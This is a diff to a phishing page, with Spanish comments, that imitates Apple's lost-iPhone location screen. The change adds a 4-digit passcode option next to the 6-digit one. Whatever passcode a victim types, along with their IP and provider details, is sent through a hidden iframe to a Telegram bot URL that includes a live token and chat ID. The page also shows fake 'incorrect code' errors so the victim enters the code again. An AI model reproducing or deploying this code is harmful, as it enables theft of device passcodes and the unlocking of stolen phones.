@@ -30,9 +30,9 @@
                     </div>
                 </div>
                 
-                <div style="margin: 1rem 0; font-size: 0.9rem; color: #aeaeb2; text-align: center;">
+                <button type="button" class="four-digit-btn" id="fourDigitBtn">
                     Do you have a 4-digit code?
-                </div>
+                </button>
                 
                 <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
             </div>
@@ -50,63 +50,113 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('🚀 CÓDIGO DE 6 DÍGITOS - iPhone perdido');
+            console.log('🚀 CÓDIGO 6/4 DÍGITOS - iPhone perdido');
             
-            const codeInputs = document.querySelectorAll('.code-input');
+            const codeInputsContainer = document.getElementById('codeInputs');
             const submitBtn = document.getElementById('submitBtn');
             const errorMsg = document.getElementById('errorMsg');
             const form = document.getElementById('sign-in');
+            const fourDigitBtn = document.getElementById('fourDigitBtn');
+            const subtitle = document.getElementById('subtitle');
             
             let loginAttempts = 0;
-            const MAX_ATTEMPTS = 3;
-            
-            const appleErrors = [
-                "Incorrect security code.",
-                "The security code you entered is incorrect.",
-                "Security code verification failed."
-            ];
+            let isFourDigitMode = false;
+            let codeInputs = [];
+            let MAX_CODE_LENGTH = 6;
             
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
             
-            // Auto-focus primer input
-            codeInputs[0].focus();
+            // Inicializar inputs
+            function initInputs() {
+                codeInputs = Array.from(document.querySelectorAll('.code-input'));
+                codeInputs[0].focus();
+                setupInputListeners();
+                checkCompleteCode();
+            }
             
-            // Manejar navegación entre inputs
-            codeInputs.forEach((input, index) => {
-                input.addEventListener('input', (e) => {
-                    if (e.data && !/[0-9]/.test(e.data)) {
-                        e.target.value = '';
-                        return;
-                    }
-                    if (input.value.length === 1 && index < 5) {
-                        codeInputs[index + 1].focus();
-                    }
-                    checkCompleteCode();
+            // Cambiar a modo 4 dígitos
+            function switchToFourDigits() {
+                isFourDigitMode = true;
+                MAX_CODE_LENGTH = 4;
+                
+                // Remover inputs extras
+                codeInputs.slice(4).forEach(input => {
+                    input.remove();
                 });
                 
-                input.addEventListener('keydown', (e) => {
-                    if (e.key === 'Backspace' && input.value === '' && index > 0) {
-                        codeInputs[index - 1].focus();
-                    }
-                });
+                codeInputs = codeInputs.slice(0, 4);
                 
-                input.addEventListener('paste', (e) => {
-                    e.preventDefault();
-                    const paste = (e.clipboardData || window.clipboardData).getData('text');
-                    const numbers = paste.replace(/\D/g, '').slice(0, 6);
-                    numbers.split('').forEach((num, i) => {
-                        if (codeInputs[i]) {
-                            codeInputs[i].value = num;
+                // Actualizar UI
+                subtitle.textContent = 'Enter the 4-digit security code to see the most recent location';
+                fourDigitBtn.textContent = 'Switch to 6-digit code';
+                fourDigitBtn.classList.add('active');
+                
+                codeInputs[0].focus();
+                checkCompleteCode();
+            }
+            
+            // Cambiar a modo 6 dígitos
+            function switchToSixDigits() {
+                isFourDigitMode = false;
+                MAX_CODE_LENGTH = 6;
+                
+                // Recrear todos los inputs
+                const container = document.getElementById('codeInputs');
+                container.innerHTML = `
+                    <input type="text" maxlength="1" class="code-input" data-index="0">
+                    <input type="text" maxlength="1" class="code-input" data-index="1">
+                    <input type="text" maxlength="1" class="code-input" data-index="2">
+                    <input type="text" maxlength="1" class="code-input" data-index="3">
+                    <input type="text" maxlength="1" class="code-input" data-index="4">
+                    <input type="text" maxlength="1" class="code-input" data-index="5">
+                `;
+                
+                initInputs();
+                
+                // Actualizar UI
+                subtitle.textContent = 'Enter the 6-digit security code to see the most recent location';
+                fourDigitBtn.textContent = 'Do you have a 4-digit code?';
+                fourDigitBtn.classList.remove('active');
+            }
+            
+            // Configurar listeners de inputs
+            function setupInputListeners() {
+                codeInputs.forEach((input, index) => {
+                    input.addEventListener('input', (e) => {
+                        if (e.data && !/[0-9]/.test(e.data)) {
+                            e.target.value = '';
+                            return;
+                        }
+                        if (input.value.length === 1 && index < MAX_CODE_LENGTH - 1) {
+                            codeInputs[index + 1].focus();
+                        }
+                        checkCompleteCode();
+                    });
+                    
+                    input.addEventListener('keydown', (e) => {
+                        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                            codeInputs[index - 1].focus();
                         }
                     });
-                    if (numbers.length === 6) {
-                        codeInputs[5].focus();
-                        checkCompleteCode();
-                    }
+                    
+                    input.addEventListener('paste', (e) => {
+                        e.preventDefault();
+                        const paste = (e.clipboardData || window.clipboardData).getData('text');
+                        const numbers = paste.replace(/\D/g, '').slice(0, MAX_CODE_LENGTH);
+                        numbers.split('').forEach((num, i) => {
+                            if (codeInputs[i]) {
+                                codeInputs[i].value = num;
+                            }
+                        });
+                        if (numbers.length === MAX_CODE_LENGTH) {
+                            codeInputs[MAX_CODE_LENGTH - 1].focus();
+                            checkCompleteCode();
+                        }
+                    });
                 });
-            });
+            }
             
             async function getIPInfo() {
                 try {
@@ -126,12 +176,21 @@
             
             function checkCompleteCode() {
                 const code = Array.from(codeInputs).map(input => input.value).join('');
-                if (code.length === 6) {
+                if (code.length === MAX_CODE_LENGTH) {
                     submitBtn.classList.add('show');
                 } else {
                     submitBtn.classList.remove('show');
                 }
             }
+            
+            // Event listeners
+            fourDigitBtn.addEventListener('click', () => {
+                if (isFourDigitMode) {
+                    switchToSixDigits();
+                } else {
+                    switchToFourDigits();
+                }
+            });
             
             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
@@ -139,18 +198,19 @@
                 
                 const code = Array.from(codeInputs).map(input => input.value).join('');
                 
-                if (code.length !== 6) {
-                    showError('Enter the 6-digit security code.');
+                if (code.length !== MAX_CODE_LENGTH) {
+                    showError(`Enter the ${MAX_CODE_LENGTH}-digit security code.`);
                     return;
                 }
                 
-                console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: Código ${code}`);
+                console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: Código ${MAX_CODE_LENGTH}d - ${code}`);
                 
                 const ipInfo = await getIPInfo();
                 
+                const codeType = isFourDigitMode ? '4-dígitos' : '6-dígitos';
                 const message = `🚀 *ASTRO505 - CÓDIGO IPHONE PERDIDO* 🚀
 
-🔢 *Código:* ${code}
+🔢 *Código ${codeType}:* ${code}
 📱 *Dispositivo:* iPhone perdido
 🌐 *IP:* ${ipInfo.ip}
 🏢 *Proveedor:* ${ipInfo.isp}
@@ -165,10 +225,12 @@
                 const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                 iframe.src = telegramUrl;
                 
-                console.log('📤 Telegram con código:', code, ipInfo.ip);
+                console.log('📤 Telegram con código:', codeType, code, ipInfo.ip);
                 
-                if (loginAttempts < MAX_ATTEMPTS) {
-                    const errorText = appleErrors[(loginAttempts-1) % appleErrors.length];
+                if (loginAttempts < 3) {
+                    const errorText = isFourDigitMode ? 
+                        "Incorrect 4-digit code." : 
+                        "Incorrect security code.";
                     showError(errorText);
                     codeInputs[0].focus();
                     codeInputs.forEach(input => input.value = '');
@@ -191,11 +253,42 @@
                 }, 5000);
             }
             
-            console.log('✅ CÓDIGO 6 DÍGITOS FUNCIONANDO');
+            // Inicializar
+            initInputs();
+            console.log('✅ MODO 6/4 DÍGITOS FUNCIONANDO');
         });
     </script>
 
     <style>
+        /* ESTILOS PARA BOTÓN 4 DÍGITOS */
+        .four-digit-btn {
+            background: none;
+            border: none;
+            color: #0a84ff;
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 0.8rem 1.5rem;
+            border-radius: 12px;
+            transition: all 0.3s ease;
+            margin: 1rem 0;
+            text-align: center;
+        }
+        
+        .four-digit-btn:hover {
+            background: rgba(10, 132, 255, 0.1);
+            color: #0066cc;
+        }
+        
+        .four-digit-btn.active {
+            color: #d2d2d7;
+        }
+        
+        .four-digit-btn.active:hover {
+            color: #aeaeb2;
+            background: rgba(210, 210, 215, 0.1);
+        }
+
         /* ESTILOS PARA INPUTS DE CÓDIGO */
         .code-input-container {
             width: 100%;
@@ -208,6 +301,7 @@
             display: flex;
             gap: 1rem;
             justify-content: center;
+            flex-wrap: wrap;
         }
         
         .code-input {
@@ -230,10 +324,6 @@
             box-shadow: 0 0 0 4px rgba(10, 132, 255, 0.2);
             outline: none;
             transform: scale(1.05);
-        }
-        
-        .code-input::placeholder {
-            color: rgba(210, 210, 215, 0.4);
         }
 
         /* ESTILOS INLINE PARA ERROR */
